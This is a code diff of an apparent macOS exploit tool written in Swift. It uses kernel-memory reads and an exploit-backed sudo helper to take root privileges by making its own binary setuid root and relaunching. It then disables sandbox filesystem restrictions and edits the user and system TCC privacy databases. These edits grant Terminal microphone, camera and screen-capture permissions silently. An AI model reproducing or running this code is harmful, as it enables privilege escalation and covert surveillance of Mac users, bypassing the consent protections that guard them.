@@ -250,11 +250,59 @@ extension CaptureSession {
 }
 
 
-// MARK: Utils
+// MARK: - Privilege escalation
+enum CommandError: Error {
+    case status(Int)
+    case error(Int)
+}
+
+func sudoRun(_ util: xe_util_sudo_t, cmd: String, args: [String]) throws {
+    var argArray = args.map { UnsafePointer<Int8>(strdup($0)) }
+    
+    let res = xe_util_sudo_run(util, cmd, &argArray, argArray.count)
+    
+    if res != 0 {
+        throw CommandError.status(Int(res))
+    }
+}
+
+
+func fixBinaryPrivilege() throws {
+    let binary = Bundle.main.executablePath!
+    
+    xe_util_msdosfs_loadkext()
+    var sudo = xe_util_sudo_create()
+    defer { xe_util_sudo_destroy(&sudo) }
+    
+    print("[I] changing owner to root")
+    try sudoRun(sudo!, cmd: "/usr/sbin/chown", args: ["-n", "0:0", binary])
+    
+    print("[I] enabling setuid")
+    try sudoRun(sudo!, cmd: "/bin/chmod", args: ["4755", binary])
+}
+
+func relaunch() throws {
+    let binary = Bundle.main.executablePath
+    var pid: pid_t = 0
+    
+    var error = posix_spawn(&pid, binary, nil, nil, CommandLine.unsafeArgv, nil)
+    guard error == 0 else {
+        throw CommandError.error(Int(error))
+    }
+    
+    var stat_loc: Int32 = -1
+    repeat {
+        error = waitpid(pid, &stat_loc, 0)
+    } while error == EINTR || (error == 0 && (stat_loc & 0177) != 0)
+}
+
+
+// MARK: - Utils
+
 func findTerminalProcess() throws -> uintptr_t {
     var cursor: uintptr_t = xe_xnu_proc_current_proc()
     while cursor != 0 {
-        let pid = xe_kmem_read_uint32(cursor, UInt(TYPE_PROC_MEM_P_PID_OFFSET))
+        let pid = xe_kmem_read_uint32(cursor, Int(TYPE_PROC_MEM_P_PID_OFFSET))
         
         let binary_path = String(unsafeUninitializedCapacity: Int(PATH_MAX)) { ptr in
             return Int(proc_pidpath(Int32(pid), ptr.baseAddress!, UInt32(PATH_MAX)))
@@ -264,7 +312,7 @@ func findTerminalProcess() throws -> uintptr_t {
             return cursor
         }
         
-        let next = xe_kmem_read_ptr(cursor, UInt(TYPE_PROC_MEM_P_PPTR_OFFSET))
+        let next = xe_kmem_read_ptr(cursor, Int(TYPE_PROC_MEM_P_PPTR_OFFSET))
         if next != cursor {
             cursor = next
         } else {
@@ -274,6 +322,8 @@ func findTerminalProcess() throws -> uintptr_t {
     throw POSIXError(.ENOENT)
 }
 
+
+// MARK: - Main
 
 if (CommandLine.argc != 5) {
     print("[E] invalid arguments")
@@ -311,18 +361,32 @@ guard let terminal_process = try? findTerminalProcess() else {
     exit(1)
 }
 
-let user_uid = xe_kmem_read_uint32(terminal_process, UInt(TYPE_PROC_MEM_P_UID_OFFSET))
-let home_dir = String(cString: getpwuid(user_uid)!.pointee.pw_dir!)
-let tcc_database = URL(fileURLWithPath: "Library/Application Support/com.apple.TCC/TCC.db", relativeTo: URL(fileURLWithPath: home_dir)).path
+setuid(0)
 
-print("[I] using TCC database at", tcc_database)
+guard getuid() == 0 else {
+    print("[I] launched without root, obtaining root privilege")
+    try fixBinaryPrivilege()
+    print("[I] relaunching")
+    try relaunch()
+    exit(0)
+}
+
+let user_uid = xe_kmem_read_uint32(terminal_process, Int(TYPE_PROC_MEM_P_UID_OFFSET))
+let home_dir = String(cString: getpwuid(user_uid)!.pointee.pw_dir!)
+let user_tcc_database = URL(fileURLWithPath: "Library/Application Support/com.apple.TCC/TCC.db", relativeTo: URL(fileURLWithPath: home_dir)).path
+var system_tcc_database = "/Library/Application Support/com.apple.TCC/TCC.db"
+
+print("[I] using user TCC database at", user_tcc_database)
+print("[I] using system TCC database at", system_tcc_database)
+
+print("[I] intializing sandbox utility")
+var util_sandbox = xe_util_sandbox_create()
 
 print("[I] disabling sandbox FS restrictions")
-var util_sandbox = xe_util_sandbox_create()
 xe_util_sandbox_disable_fs_restrictions(util_sandbox!)
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceMicrophone")
-var error = xe_util_tcc_authorize(tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
+var error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceMicrophone")
 if error != 0 {
     print("[E] cannot send authorization to TCC.db, err:", error)
     xe_util_sandbox_destroy(&util_sandbox)
@@ -330,9 +394,17 @@ if error != 0 {
 }
 
 print("[I] authorizing com.apple.Terminal to use kTCCServiceCamera")
-error = xe_util_tcc_authorize(tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
+error = xe_util_tcc_authorize(user_tcc_database, "com.apple.Terminal", "kTCCServiceCamera")
 if error != 0 {
     print("[E] cannot send authorization to TCC.db, err:", error)
+    xe_util_sandbox_destroy(&util_sandbox)
+    abort()
+}
+
+print("[I] authorizing com.apple.Terminal to use kTCCServiceScreenCapture")
+error = xe_util_tcc_authorize(system_tcc_database, "com.apple.Terminal", "kTCCServiceScreenCapture")
+if error != 0 {
+    print("[E] cannot send authorization to system TCC.db, err:", error)
     xe_util_sandbox_destroy(&util_sandbox)
     abort()
 }
